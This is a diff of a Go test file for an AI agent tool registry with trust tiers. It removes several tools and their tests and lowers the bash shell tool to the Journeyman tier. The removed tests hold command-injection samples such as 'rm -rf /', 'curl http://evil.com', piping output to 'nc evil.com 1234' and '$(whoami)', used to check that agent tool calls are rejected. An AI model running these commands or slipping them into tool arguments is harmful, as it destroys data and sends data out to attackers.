@@ -34,33 +34,23 @@ func TestBuiltinToolTierAlignment(t *testing.T) {
 		reason   string
 	}{
 		// Apprentice — read-only; safe for every agent regardless of level.
-		{tool: "read_file", wantTier: domain.TierApprentice, reason: "read-only file access"},
+		{tool: "read_file", wantTier: domain.TierApprentice, reason: "read-only file access (supports optional line range)"},
 		{tool: "list_directory", wantTier: domain.TierApprentice, reason: "read-only directory listing"},
 		{tool: "search_text", wantTier: domain.TierApprentice, reason: "read-only text search"},
 		{tool: "glob_files", wantTier: domain.TierApprentice, reason: "read-only file discovery"},
-		{tool: "read_file_range", wantTier: domain.TierApprentice, reason: "read-only partial file access"},
 		{tool: "submit_work_product", wantTier: domain.TierApprentice, reason: "all tiers can submit work"},
 		{tool: "ask_clarification", wantTier: domain.TierApprentice, reason: "all tiers can ask questions"},
-		{tool: "inspect_environment", wantTier: domain.TierApprentice, reason: "read-only environment inspection"},
 
 		{tool: "write_file", wantTier: domain.TierApprentice, reason: "sandbox workspace — all tiers write files"},
-		{tool: "create_directory", wantTier: domain.TierApprentice, reason: "sandbox workspace — needed alongside write_file"},
 
 		// Journeyman — targeted writes, network access, and execution require demonstrated trust.
 		{tool: "patch_file", wantTier: domain.TierJourneyman, reason: "targeted file edits require level 6+"},
 		{tool: "http_request", wantTier: domain.TierJourneyman, reason: "network access requires level 6+"},
-		{tool: "rename_file", wantTier: domain.TierJourneyman, reason: "filesystem writes require level 6+"},
-		{tool: "delete_file", wantTier: domain.TierJourneyman, reason: "destructive operations require level 6+"},
-		{tool: "run_tests", wantTier: domain.TierJourneyman, reason: "allowlist-constrained test execution"},
-		{tool: "lint_check", wantTier: domain.TierJourneyman, reason: "allowlist-constrained lint execution"},
-		{tool: "git_operation", wantTier: domain.TierJourneyman, reason: "structured git operations"},
-		{tool: "build_project", wantTier: domain.TierJourneyman, reason: "build system execution"},
 
-		// Expert — dependency management requires level 11+.
-		{tool: "manage_dependencies", wantTier: domain.TierExpert, reason: "dependency changes affect builds"},
+		// Journeyman — sandbox is the security boundary; shell needs same trust as file writes.
+		{tool: "bash", wantTier: domain.TierJourneyman, reason: "sandbox-constrained shell execution"},
 
-		// Master — unrestricted shell and party-lead DAG operations require level 16+.
-		{tool: "bash", wantTier: domain.TierMaster, reason: "unrestricted shell requires high trust"},
+		// Master — party-lead DAG operations require level 16+.
 		{tool: "decompose_quest", wantTier: domain.TierMaster, reason: "only party leads (Master+) can decompose quests"},
 		{tool: "review_sub_quest", wantTier: domain.TierMaster, reason: "only party leads (Master+) can review sub-quests"},
 		{tool: "answer_clarification", wantTier: domain.TierMaster, reason: "only party leads (Master+) can answer clarifications"},
@@ -99,21 +89,17 @@ func TestBuiltinToolCount(t *testing.T) {
 	t.Parallel()
 
 	// RegisterBuiltins registers:
-	//   read_file, read_file_range, list_directory, search_text,
-	//   glob_files, inspect_environment                — 6 read-only Apprentice tools
-	//   write_file, create_directory                   — 2 write Apprentice tools (sandbox workspace)
+	//   read_file, list_directory, search_text,
+	//   glob_files                                     — 4 read-only Apprentice tools
+	//   write_file                                     — 1 write Apprentice tool (sandbox workspace)
 	//   submit_work_product, ask_clarification         — 2 terminal tools (Apprentice)
-	//   patch_file, rename_file, delete_file           — 3 Journeyman tools
-	//   http_request, run_tests, lint_check            — 3 Journeyman tools
-	//   git_operation, build_project                   — 2 Journeyman tools
-	//   run_command                                    — 1 Master tool
-	//   manage_dependencies                            — 1 Expert tool
+	//   patch_file, http_request, bash                 — 3 Journeyman tools
 	//   decompose_quest, review_sub_quest,
 	//   answer_clarification                           — 3 DAG tools (Master)
 	//
 	// web_search is excluded — registered conditionally via RegisterWebSearch.
 	// graph_query is excluded — requires a live EntityQueryFunc (RegisterGraphQuery).
-	const wantCount = 23
+	const wantCount = 13
 
 	reg := NewToolRegistry()
 	reg.RegisterBuiltins()
@@ -311,393 +297,6 @@ func TestSearchTextContextLines(t *testing.T) {
 	assertContains(t, result.Content, "TARGET line") // the match
 	assertContains(t, result.Content, "line four")  // one line after
 	assertNotContains(t, result.Content, "line one") // outside context
-}
-
-// TestReadFileRange verifies that read_file_range returns the requested lines.
-func TestReadFileRange(t *testing.T) {
-	t.Parallel()
-
-	tmpDir := t.TempDir()
-	var lines []string
-	for i := 1; i <= 20; i++ {
-		lines = append(lines, fmt.Sprintf("line %02d", i))
-	}
-	mustWriteFile(t, filepath.Join(tmpDir, "big.txt"), strings.Join(lines, "\n"))
-
-	reg := NewToolRegistryWithSandbox(tmpDir)
-	reg.RegisterBuiltins()
-
-	agent := &agentprogression.Agent{Tier: domain.TierApprentice}
-	quest := &domain.Quest{}
-
-	t.Run("reads specified range", func(t *testing.T) {
-		t.Parallel()
-		call := makeToolCall("read_file_range", map[string]any{
-			"path":         filepath.Join(tmpDir, "big.txt"),
-			"start_line":   float64(5),
-			"end_line":     float64(10),
-			"_sandbox_dir": tmpDir,
-		})
-		result := reg.Execute(context.Background(), call, quest, agent)
-		if result.Error != "" {
-			t.Fatalf("unexpected error: %s", result.Error)
-		}
-		for i := 5; i <= 10; i++ {
-			assertContains(t, result.Content, fmt.Sprintf("line %02d", i))
-		}
-		// Lines outside the range must not appear.
-		assertNotContains(t, result.Content, "line 04")
-		assertNotContains(t, result.Content, "line 11")
-	})
-
-	t.Run("defaults end_line to start + 100", func(t *testing.T) {
-		t.Parallel()
-		call := makeToolCall("read_file_range", map[string]any{
-			"path":         filepath.Join(tmpDir, "big.txt"),
-			"start_line":   float64(1),
-			"_sandbox_dir": tmpDir,
-		})
-		result := reg.Execute(context.Background(), call, quest, agent)
-		if result.Error != "" {
-			t.Fatalf("unexpected error: %s", result.Error)
-		}
-		assertContains(t, result.Content, "line 01")
-		assertContains(t, result.Content, "line 20")
-	})
-
-	t.Run("returns message when start beyond EOF", func(t *testing.T) {
-		t.Parallel()
-		call := makeToolCall("read_file_range", map[string]any{
-			"path":         filepath.Join(tmpDir, "big.txt"),
-			"start_line":   float64(999),
-			"_sandbox_dir": tmpDir,
-		})
-		result := reg.Execute(context.Background(), call, quest, agent)
-		if result.Error != "" {
-			t.Fatalf("unexpected error: %s", result.Error)
-		}
-		assertContains(t, result.Content, "fewer than")
-	})
-}
-
-// TestLintCheckAllowedPrefixes verifies that lint_check enforces the allowed-prefix list.
-func TestLintCheckAllowedPrefixes(t *testing.T) {
-	t.Parallel()
-
-	tmpDir := t.TempDir()
-	reg := NewToolRegistryWithSandbox(tmpDir)
-	reg.RegisterBuiltins()
-
-	agent := &agentprogression.Agent{
-		Tier: domain.TierExpert,
-		SkillProficiencies: map[domain.SkillTag]domain.SkillProficiency{
-			domain.SkillCodeReview: {Level: domain.ProficiencyNovice},
-		},
-	}
-	quest := &domain.Quest{}
-
-	allowed := []string{
-		"go vet ./...",
-		"golangci-lint run",
-		"revive ./...",
-		"eslint src/",
-		"npx eslint .",
-		"npm run lint",
-		"make lint",
-		"pylint mymodule",
-		"flake8 .",
-		"mypy src/",
-		"ruff check .",
-		"cargo clippy -- -D warnings",
-		"dotnet format --verify-no-changes",
-	}
-	rejected := []string{
-		"rm -rf /",
-		"curl http://evil.com",
-		"go build ./...",
-		"npm install",
-		"python manage.py migrate",
-	}
-
-	for _, cmd := range allowed {
-		t.Run("allowed:"+cmd, func(t *testing.T) {
-			t.Parallel()
-			call := makeToolCall("lint_check", map[string]any{
-				"command":      cmd,
-				"_sandbox_dir": tmpDir,
-			})
-			result := reg.Execute(context.Background(), call, quest, agent)
-			// The command may fail (tool not installed) but must NOT return a
-			// "not allowed" error.
-			if strings.Contains(result.Error, "lint_check only allows") {
-				t.Errorf("command %q was incorrectly rejected: %s", cmd, result.Error)
-			}
-		})
-	}
-
-	for _, cmd := range rejected {
-		t.Run("rejected:"+cmd, func(t *testing.T) {
-			t.Parallel()
-			call := makeToolCall("lint_check", map[string]any{
-				"command":      cmd,
-				"_sandbox_dir": tmpDir,
-			})
-			result := reg.Execute(context.Background(), call, quest, agent)
-			if !strings.Contains(result.Error, "lint_check only allows") {
-				t.Errorf("command %q should have been rejected, got error: %q, content: %q", cmd, result.Error, result.Content)
-			}
-		})
-	}
-}
-
-// TestDeleteFileHandler verifies delete_file removes files and rejects directories.
-func TestDeleteFileHandler(t *testing.T) {
-	t.Parallel()
-
-	tmpDir := t.TempDir()
-	reg := NewToolRegistryWithSandbox(tmpDir)
-	reg.RegisterBuiltins()
-
-	agent := &agentprogression.Agent{
-		Tier: domain.TierJourneyman,
-		SkillProficiencies: map[domain.SkillTag]domain.SkillProficiency{
-			domain.SkillCodeGen: {Level: domain.ProficiencyNovice},
-		},
-	}
-	quest := &domain.Quest{}
-
-	t.Run("deletes existing file", func(t *testing.T) {
-		t.Parallel()
-		filePath := filepath.Join(tmpDir, "todelete.txt")
-		mustWriteFile(t, filePath, "bye")
-
-		call := makeToolCall("delete_file", map[string]any{
-			"path":         filePath,
-			"_sandbox_dir": tmpDir,
-		})
-		result := reg.Execute(context.Background(), call, quest, agent)
-		if result.Error != "" {
-			t.Fatalf("unexpected error: %s", result.Error)
-		}
-		if _, err := os.Stat(filePath); !os.IsNotExist(err) {
-			t.Error("file still exists after delete")
-		}
-	})
-
-	t.Run("rejects directory deletion", func(t *testing.T) {
-		t.Parallel()
-		dirPath := filepath.Join(tmpDir, "keepme")
-		if err := os.MkdirAll(dirPath, 0755); err != nil {
-			t.Fatalf("setup: %v", err)
-		}
-
-		call := makeToolCall("delete_file", map[string]any{
-			"path":         dirPath,
-			"_sandbox_dir": tmpDir,
-		})
-		result := reg.Execute(context.Background(), call, quest, agent)
-		if result.Error == "" {
-			t.Fatal("expected error when deleting directory, got none")
-		}
-		assertContains(t, result.Error, "cannot delete directories")
-	})
-}
-
-// TestRenameFileHandler verifies rename_file moves a file to a new path.
-func TestRenameFileHandler(t *testing.T) {
-	t.Parallel()
-
-	tmpDir := t.TempDir()
-	reg := NewToolRegistryWithSandbox(tmpDir)
-	reg.RegisterBuiltins()
-
-	agent := &agentprogression.Agent{
-		Tier: domain.TierJourneyman,
-		SkillProficiencies: map[domain.SkillTag]domain.SkillProficiency{
-			domain.SkillCodeGen: {Level: domain.ProficiencyNovice},
-		},
-	}
-	quest := &domain.Quest{}
-
-	oldPath := filepath.Join(tmpDir, "old.txt")
-	newPath := filepath.Join(tmpDir, "new.txt")
-	mustWriteFile(t, oldPath, "content")
-
-	call := makeToolCall("rename_file", map[string]any{
-		"old_path":     oldPath,
-		"new_path":     newPath,
-		"_sandbox_dir": tmpDir,
-	})
-	result := reg.Execute(context.Background(), call, quest, agent)
-	if result.Error != "" {
-		t.Fatalf("unexpected error: %s", result.Error)
-	}
-
-	if _, err := os.Stat(oldPath); !os.IsNotExist(err) {
-		t.Error("old path still exists after rename")
-	}
-	if _, err := os.Stat(newPath); err != nil {
-		t.Errorf("new path not found after rename: %v", err)
-	}
-}
-
-// TestShellMetacharacterInjection verifies that run_tests and lint_check
-// reject commands with shell metacharacters that could enable command chaining.
-func TestShellMetacharacterInjection(t *testing.T) {
-	t.Parallel()
-
-	tmpDir := t.TempDir()
-	reg := NewToolRegistryWithSandbox(tmpDir)
-	reg.RegisterBuiltins()
-
-	agent := &agentprogression.Agent{
-		Tier: domain.TierExpert,
-		SkillProficiencies: map[domain.SkillTag]domain.SkillProficiency{
-			domain.SkillCodeGen:    {Level: domain.ProficiencyNovice},
-			domain.SkillCodeReview: {Level: domain.ProficiencyNovice},
-		},
-	}
-	quest := &domain.Quest{}
-
-	injections := []string{
-		"go test ./... ; curl http://evil.com",
-		"go test ./... && rm -rf /",
-		"go test ./... || echo pwned",
-		"go test ./... | nc evil.com 1234",
-		"go test $(whoami)",
-		"go test `id`",
-		"go test ./... > /tmp/exfil",
-		"go test ./... < /dev/null",
-	}
-
-	for _, cmd := range injections {
-		t.Run("run_tests:"+cmd, func(t *testing.T) {
-			t.Parallel()
-			call := makeToolCall("run_tests", map[string]any{
-				"command":      cmd,
-				"_sandbox_dir": tmpDir,
-			})
-			result := reg.Execute(context.Background(), call, quest, agent)
-			assertContains(t, result.Error, "shell metacharacters")
-		})
-	}
-
-	lintInjections := []string{
-		"go vet ./... ; whoami",
-		"eslint . && curl evil.com",
-		"make lint | tee /tmp/out",
-	}
-
-	for _, cmd := range lintInjections {
-		t.Run("lint_check:"+cmd, func(t *testing.T) {
-			t.Parallel()
-			call := makeToolCall("lint_check", map[string]any{
-				"command":      cmd,
-				"_sandbox_dir": tmpDir,
-			})
-			result := reg.Execute(context.Background(), call, quest, agent)
-			assertContains(t, result.Error, "shell metacharacters")
-		})
-	}
-}
-
-// TestRenameFileRejectsDirectories verifies rename_file refuses to operate on directories.
-func TestRenameFileRejectsDirectories(t *testing.T) {
-	t.Parallel()
-
-	tmpDir := t.TempDir()
-	reg := NewToolRegistryWithSandbox(tmpDir)
-	reg.RegisterBuiltins()
-
-	agent := &agentprogression.Agent{
-		Tier: domain.TierJourneyman,
-		SkillProficiencies: map[domain.SkillTag]domain.SkillProficiency{
-			domain.SkillCodeGen: {Level: domain.ProficiencyNovice},
-		},
-	}
-	quest := &domain.Quest{}
-
-	dirPath := filepath.Join(tmpDir, "mydir")
-	if err := os.MkdirAll(dirPath, 0755); err != nil {
-		t.Fatalf("setup: %v", err)
-	}
-
-	call := makeToolCall("rename_file", map[string]any{
-		"old_path":     dirPath,
-		"new_path":     filepath.Join(tmpDir, "renamed"),
-		"_sandbox_dir": tmpDir,
-	})
-	result := reg.Execute(context.Background(), call, quest, agent)
-	if result.Error == "" {
-		t.Fatal("expected error when renaming directory, got none")
-	}
-	assertContains(t, result.Error, "files only")
-}
-
-// TestCreateDirectoryHandler verifies that create_directory creates nested paths,
-// rejects empty paths, and rejects sandbox-escape attempts.
-func TestCreateDirectoryHandler(t *testing.T) {
-	t.Parallel()
-
-	tmpDir := t.TempDir()
-	// EvalSymlinks resolves macOS /var -> /private/var so validatePath sees the
-	// same real path for both the sandbox and the new directory.
-	realTmpDir, err := filepath.EvalSymlinks(tmpDir)
-	if err != nil {
-		t.Fatalf("EvalSymlinks: %v", err)
-	}
-	reg := NewToolRegistryWithSandbox(realTmpDir)
-	reg.RegisterBuiltins()
-
-	agent := &agentprogression.Agent{
-		Tier: domain.TierJourneyman,
-		SkillProficiencies: map[domain.SkillTag]domain.SkillProficiency{
-			domain.SkillCodeGen: {Level: domain.ProficiencyNovice},
-		},
-	}
-	quest := &domain.Quest{}
-
-	t.Run("creates nested directory", func(t *testing.T) {
-		t.Parallel()
-		dirPath := filepath.Join(realTmpDir, "a", "b", "c")
-		call := makeToolCall("create_directory", map[string]any{
-			"path":         dirPath,
-			"_sandbox_dir": realTmpDir,
-		})
-		result := reg.Execute(context.Background(), call, quest, agent)
-		if result.Error != "" {
-			t.Fatalf("unexpected error: %s", result.Error)
-		}
-		if info, err := os.Stat(dirPath); err != nil || !info.IsDir() {
-			t.Errorf("expected directory %s to exist after create_directory", dirPath)
-		}
-	})
-
-	t.Run("empty path returns error", func(t *testing.T) {
-		t.Parallel()
-		call := makeToolCall("create_directory", map[string]any{
-			"path":         "",
-			"_sandbox_dir": realTmpDir,
-		})
-		result := reg.Execute(context.Background(), call, quest, agent)
-		if result.Error == "" {
-			t.Fatal("expected error for empty path, got none")
-		}
-		assertContains(t, result.Error, "required")
-	})
-
-	t.Run("sandbox escape rejected", func(t *testing.T) {
-		t.Parallel()
-		call := makeToolCall("create_directory", map[string]any{
-			"path":         filepath.Join(realTmpDir, "..", "escaped"),
-			"_sandbox_dir": realTmpDir,
-		})
-		result := reg.Execute(context.Background(), call, quest, agent)
-		if result.Error == "" {
-			t.Fatal("expected error for sandbox-escaping path, got none")
-		}
-		assertContains(t, result.Error, "escapes sandbox")
-	})
 }
 
 // mockSearchProvider is a test SearchProvider that returns canned results.
@@ -1033,6 +632,20 @@ func TestReadFileHandler(t *testing.T) {
 		assertContains(t, result.Error, "failed to read file")
 	})
 
+	t.Run("directory path returns helpful error", func(t *testing.T) {
+		t.Parallel()
+		call := makeToolCall("read_file", map[string]any{
+			"path":         tmpDir,
+			"_sandbox_dir": tmpDir,
+		})
+		result := reg.Execute(context.Background(), call, quest, agent)
+		if result.Error == "" {
+			t.Fatal("expected error reading directory, got none")
+		}
+		assertContains(t, result.Error, "is a directory")
+		assertContains(t, result.Error, "list_directory")
+	})
+
 	t.Run("file larger than 100KB is truncated", func(t *testing.T) {
 		t.Parallel()
 		// Build a file that exceeds maxFileReadSize (100,000 bytes).
@@ -1200,66 +813,6 @@ func TestSearchTextCancelled(t *testing.T) {
 	}
 	assertContains(t, result.Error, "cancel")
 }
-
-// TestRunTestsHandler verifies that an allowed but nonexistent package returns
-// a command-failed error (not a metacharacter or prefix-rejection error), and
-// that a rejected command prefix is refused.
-func TestRunTestsHandler(t *testing.T) {
-	t.Parallel()
-
-	tmpDir := t.TempDir()
-	reg := NewToolRegistryWithSandbox(tmpDir)
-	reg.RegisterBuiltins()
-
-	agent := &agentprogression.Agent{
-		Tier: domain.TierExpert,
-		SkillProficiencies: map[domain.SkillTag]domain.SkillProficiency{
-			domain.SkillCodeGen:    {Level: domain.ProficiencyNovice},
-			domain.SkillCodeReview: {Level: domain.ProficiencyNovice},
-		},
-	}
-	quest := &domain.Quest{}
-
-	t.Run("allowed prefix with nonexistent package runs shell and fails", func(t *testing.T) {
-		t.Parallel()
-		call := makeToolCall("run_tests", map[string]any{
-			// This is an allowed prefix but ./nonexistent will not be found.
-			// The command passes prefix+metacharacter checks and reaches runShellCommand.
-			"command":      "go test ./nonexistent",
-			"_sandbox_dir": tmpDir,
-		})
-		result := reg.Execute(context.Background(), call, quest, agent)
-		// We expect an error because the package doesn't exist, but it must NOT
-		// be the "shell metacharacters" or "only allows test commands" rejection.
-		if strings.Contains(result.Error, "shell metacharacters") {
-			t.Fatalf("command was incorrectly rejected for metacharacters: %s", result.Error)
-		}
-		if strings.Contains(result.Error, "only allows test commands") {
-			t.Fatalf("command was incorrectly rejected as disallowed prefix: %s", result.Error)
-		}
-		// The command should fail (no such package) — verify we got some output or error.
-		if result.Error == "" && result.Content == "" {
-			t.Fatal("expected error or output from failed go test command, got neither")
-		}
-	})
-
-	t.Run("rejected command prefix is refused", func(t *testing.T) {
-		t.Parallel()
-		call := makeToolCall("run_tests", map[string]any{
-			"command":      "rm -rf /tmp/something",
-			"_sandbox_dir": tmpDir,
-		})
-		result := reg.Execute(context.Background(), call, quest, agent)
-		if result.Error == "" {
-			t.Fatal("expected rejection of disallowed command prefix, got none")
-		}
-		assertContains(t, result.Error, "only allows test commands")
-	})
-}
-
-// =============================================================================
-// writeFileHandler tests
-// =============================================================================
 
 // TestWriteFileHandler verifies that write_file creates files, creates parent
 // directories when missing, enforces the 1 MB size limit, and rejects sandbox
@@ -1693,8 +1246,8 @@ func TestGetToolsForQuest(t *testing.T) {
 		// Apprentice can read but not write.
 		assertContainsStr(t, names, "read_file")
 		assertContainsStr(t, names, "list_directory")
-		assertNotContainsStr(t, names, "write_file") // TierExpert required
-		assertNotContainsStr(t, names, "bash") // TierMaster required
+		assertNotContainsStr(t, names, "write_file") // SkillCodeGen required
+		assertNotContainsStr(t, names, "bash") // TierJourneyman required
 	})
 
 	t.Run("master tier sees all tools (with required skills)", func(t *testing.T) {
@@ -1717,7 +1270,6 @@ func TestGetToolsForQuest(t *testing.T) {
 		assertContainsStr(t, names, "read_file")
 		assertContainsStr(t, names, "write_file")
 		assertContainsStr(t, names, "bash")
-		assertContainsStr(t, names, "run_tests")
 	})
 
 	t.Run("quest AllowedTools restricts available tools", func(t *testing.T) {
@@ -1862,287 +1414,5 @@ func assertNotContains(t *testing.T, s, substr string) {
 	t.Helper()
 	if strings.Contains(s, substr) {
 		t.Errorf("expected %q NOT to contain %q", s, substr)
-	}
-}
-
-// =============================================================================
-// GIT OPERATION VALIDATION
-// =============================================================================
-
-func TestBuildGitCommand(t *testing.T) {
-	t.Parallel()
-
-	tests := []struct {
-		name    string
-		args    map[string]any
-		want    string
-		wantErr string
-	}{
-		{
-			name:    "missing action",
-			args:    map[string]any{},
-			wantErr: "action argument is required",
-		},
-		{
-			name:    "blocked action push",
-			args:    map[string]any{"action": "push"},
-			wantErr: "not allowed",
-		},
-		{
-			name:    "blocked action rebase",
-			args:    map[string]any{"action": "rebase"},
-			wantErr: "not allowed",
-		},
-		{
-			name:    "blocked action reset",
-			args:    map[string]any{"action": "reset"},
-			wantErr: "not allowed",
-		},
-		{
-			name: "blocked --force flag",
-			args: map[string]any{"action": "checkout", "args": "--force main"},
-			wantErr: "--force",
-		},
-		{
-			name: "blocked --hard flag",
-			args: map[string]any{"action": "checkout", "args": "--hard"},
-			wantErr: "--hard",
-		},
-		{
-			name: "shell metacharacter in args",
-			args: map[string]any{"action": "log", "args": "--oneline; rm -rf /"},
-			wantErr: "shell metacharacters",
-		},
-		{
-			name: "clone missing url",
-			args: map[string]any{"action": "clone"},
-			wantErr: "url argument is required",
-		},
-		{
-			name: "clone invalid url scheme",
-			args: map[string]any{"action": "clone", "url": "ftp://example.com/repo"},
-			wantErr: "must start with https:// or git@",
-		},
-		{
-			name: "clone valid https url",
-			args: map[string]any{"action": "clone", "url": "https://github.com/org/repo"},
-			want: "git clone --depth 1 'https://github.com/org/repo'",
-		},
-		{
-			name: "clone valid git@ url",
-			args: map[string]any{"action": "clone", "url": "git@github.com:org/repo.git"},
-			want: "git clone --depth 1 'git@github.com:org/repo.git'",
-		},
-		{
-			name: "clone with target dir",
-			args: map[string]any{"action": "clone", "url": "https://github.com/org/repo", "args": "mydir"},
-			want: "git clone --depth 1 'https://github.com/org/repo' mydir",
-		},
-		{
-			name: "commit missing message",
-			args: map[string]any{"action": "commit"},
-			wantErr: "message argument is required",
-		},
-		{
-			name: "commit with message",
-			args: map[string]any{"action": "commit", "message": "feat: add parser"},
-			want: "git commit -m 'feat: add parser'",
-		},
-		{
-			name: "simple status",
-			args: map[string]any{"action": "status"},
-			want: "git status",
-		},
-		{
-			name: "log with args",
-			args: map[string]any{"action": "log", "args": "--oneline -10"},
-			want: "git log --oneline -10",
-		},
-		{
-			name: "add with file path",
-			args: map[string]any{"action": "add", "args": "src/main.go"},
-			want: "git add src/main.go",
-		},
-	}
-
-	for _, tc := range tests {
-		t.Run(tc.name, func(t *testing.T) {
-			t.Parallel()
-			call := agentic.ToolCall{ID: "test", Name: "git_operation", Arguments: tc.args}
-			got, err := buildGitCommand(call)
-			if tc.wantErr != "" {
-				if err == nil {
-					t.Fatalf("expected error containing %q, got nil", tc.wantErr)
-				}
-				if !strings.Contains(err.Error(), tc.wantErr) {
-					t.Errorf("error %q should contain %q", err.Error(), tc.wantErr)
-				}
-				return
-			}
-			if err != nil {
-				t.Fatalf("unexpected error: %v", err)
-			}
-			if got != tc.want {
-				t.Errorf("got %q, want %q", got, tc.want)
-			}
-		})
-	}
-}
-
-// =============================================================================
-// BUILD PROJECT VALIDATION
-// =============================================================================
-
-func TestBuildProjectCommand(t *testing.T) {
-	t.Parallel()
-
-	tests := []struct {
-		name    string
-		args    map[string]any
-		wantErr string
-		wantSub string // substring that should appear in the command
-	}{
-		{
-			name:    "default build produces detection script",
-			args:    map[string]any{},
-			wantSub: "Detected: Gradle",
-		},
-		{
-			name:    "valid target clean",
-			args:    map[string]any{"target": "clean"},
-			wantSub: "gradle clean",
-		},
-		{
-			name:    "target with shell metachar rejected",
-			args:    map[string]any{"target": "clean; rm -rf /"},
-			wantErr: "alphanumeric",
-		},
-		{
-			name:    "target with spaces rejected",
-			args:    map[string]any{"target": "clean build"},
-			wantErr: "alphanumeric",
-		},
-		{
-			name:    "go-style target path allowed",
-			args:    map[string]any{"target": "./cmd/server"},
-			wantSub: "go build ./cmd/server",
-		},
-	}
-
-	for _, tc := range tests {
-		t.Run(tc.name, func(t *testing.T) {
-			t.Parallel()
-			call := agentic.ToolCall{ID: "test", Name: "build_project", Arguments: tc.args}
-			got, err := buildProjectCommand(call)
-			if tc.wantErr != "" {
-				if err == nil {
-					t.Fatalf("expected error containing %q, got nil", tc.wantErr)
-				}
-				if !strings.Contains(err.Error(), tc.wantErr) {
-					t.Errorf("error %q should contain %q", err.Error(), tc.wantErr)
-				}
-				return
-			}
-			if err != nil {
-				t.Fatalf("unexpected error: %v", err)
-			}
-			if tc.wantSub != "" && !strings.Contains(got, tc.wantSub) {
-				t.Errorf("command %q should contain %q", got, tc.wantSub)
-			}
-		})
-	}
-}
-
-// =============================================================================
-// MANAGE DEPENDENCIES VALIDATION
-// =============================================================================
-
-func TestBuildManageDepsCommand(t *testing.T) {
-	t.Parallel()
-
-	tests := []struct {
-		name    string
-		args    map[string]any
-		wantErr string
-		wantSub string
-	}{
-		{
-			name:    "missing action",
-			args:    map[string]any{},
-			wantErr: "action argument is required",
-		},
-		{
-			name:    "invalid action",
-			args:    map[string]any{"action": "upgrade"},
-			wantErr: "not supported",
-		},
-		{
-			name:    "add without packages",
-			args:    map[string]any{"action": "add"},
-			wantErr: "packages argument is required",
-		},
-		{
-			name:    "remove without packages",
-			args:    map[string]any{"action": "remove"},
-			wantErr: "packages argument is required",
-		},
-		{
-			name:    "invalid package name with shell chars",
-			args:    map[string]any{"action": "add", "packages": []any{"lodash; rm -rf /"}},
-			wantErr: "invalid package name",
-		},
-		{
-			name:    "valid install",
-			args:    map[string]any{"action": "install"},
-			wantSub: "go mod download",
-		},
-		{
-			name:    "valid add with packages",
-			args:    map[string]any{"action": "add", "packages": []any{"lodash", "@types/lodash"}},
-			wantSub: "npm install lodash @types/lodash",
-		},
-		{
-			name:    "valid tidy",
-			args:    map[string]any{"action": "tidy"},
-			wantSub: "go mod tidy",
-		},
-		{
-			name:    "valid list",
-			args:    map[string]any{"action": "list"},
-			wantSub: "go list -m all",
-		},
-		{
-			name:    "scoped npm package allowed",
-			args:    map[string]any{"action": "add", "packages": []any{"@angular/core"}},
-			wantSub: "@angular/core",
-		},
-		{
-			name:    "go module path allowed",
-			args:    map[string]any{"action": "add", "packages": []any{"github.com/pkg/errors"}},
-			wantSub: "github.com/pkg/errors",
-		},
-	}
-
-	for _, tc := range tests {
-		t.Run(tc.name, func(t *testing.T) {
-			t.Parallel()
-			call := agentic.ToolCall{ID: "test", Name: "manage_dependencies", Arguments: tc.args}
-			got, err := buildManageDepsCommand(call)
-			if tc.wantErr != "" {
-				if err == nil {
-					t.Fatalf("expected error containing %q, got nil", tc.wantErr)
-				}
-				if !strings.Contains(err.Error(), tc.wantErr) {
-					t.Errorf("error %q should contain %q", err.Error(), tc.wantErr)
-				}
-				return
-			}
-			if err != nil {
-				t.Fatalf("unexpected error: %v", err)
-			}
-			if tc.wantSub != "" && !strings.Contains(got, tc.wantSub) {
-				t.Errorf("command %q should contain %q", got, tc.wantSub)
-			}
-		})
 	}
 }
